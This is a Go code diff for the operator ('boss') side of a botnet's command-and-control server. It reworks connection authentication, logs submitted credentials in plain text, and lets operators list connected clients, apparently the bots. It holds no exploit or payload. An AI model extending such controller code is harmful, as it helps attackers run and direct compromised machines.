@@ -9,27 +9,30 @@ import (
 	"strconv"
 	"strings"
 
-	"github.com/phanletrunghieu/botnet/common/cmd"
+	"github.com/phanletrunghieu/botnet/server/service/client"
 
 	"github.com/satori/go.uuid"
 
+	"github.com/phanletrunghieu/botnet/common/cmd"
 	"github.com/phanletrunghieu/botnet/server/domain"
 )
 
 // Service struct
 type Service struct {
-	listener net.Listener
-	Bosses   []*domain.Boss
-	Error    chan error
+	listener      net.Listener
+	Bosses        []*domain.Boss
+	clientService *client.Service
+	Error         chan error
 }
 
 // NewBossService create tcpService struct
-func NewBossService(port int) *Service {
+func NewBossService(port int, clientService *client.Service) *Service {
 	ln, err := net.Listen("tcp", ":"+strconv.Itoa(port))
 
 	service := &Service{
-		listener: ln,
-		Error:    make(chan error),
+		clientService: clientService,
+		listener:      ln,
+		Error:         make(chan error),
 	}
 
 	if err != nil {
@@ -58,12 +61,6 @@ func (s *Service) acceptConnection() {
 			Conn: conn,
 		}
 
-		if err := s.authenticate(boss); err != nil {
-			s.Error <- err
-			continue
-		}
-
-		s.Bosses = append(s.Bosses, boss)
 		go s.handleConnection(boss)
 	}
 }
@@ -76,6 +73,7 @@ func (s *Service) authenticate(boss *domain.Boss) error {
 
 	msg = strings.TrimSpace(msg)
 	userInfo := strings.Split(msg, " ")
+	log.Println("auth....", userInfo)
 	if len(userInfo) != 2 {
 		return errors.New("Fail to authenticate")
 	}
@@ -85,12 +83,25 @@ func (s *Service) authenticate(boss *domain.Boss) error {
 	}
 
 	boss.IsAuthenticated = true
-	log.Println("Authenticated!")
 
 	return nil
 }
 
 func (s *Service) handleConnection(boss *domain.Boss) {
+	// auth
+	for {
+		err := s.authenticate(boss)
+		if err != nil {
+			boss.Conn.Write([]byte("Unauthenticated!\r"))
+			s.Error <- err
+		} else {
+			break
+		}
+	}
+	boss.Conn.Write([]byte("Authenticated!\r"))
+	s.Bosses = append(s.Bosses, boss)
+
+	// pass
 	for {
 		buffCommand := make([]byte, 2)
 		_, err := boss.Conn.Read(buffCommand)
@@ -103,7 +114,8 @@ func (s *Service) handleConnection(boss *domain.Boss) {
 
 		switch string(buffCommand) {
 		case cmd.ListBosses:
-			fmt.Fprintf(boss.Conn, "lsdasda\n\r")
+			log.Println("xxxx", s.clientService.Clients)
+			fmt.Fprintf(boss.Conn, "%v\r", s.clientService.Clients)
 			break
 		}
 	}
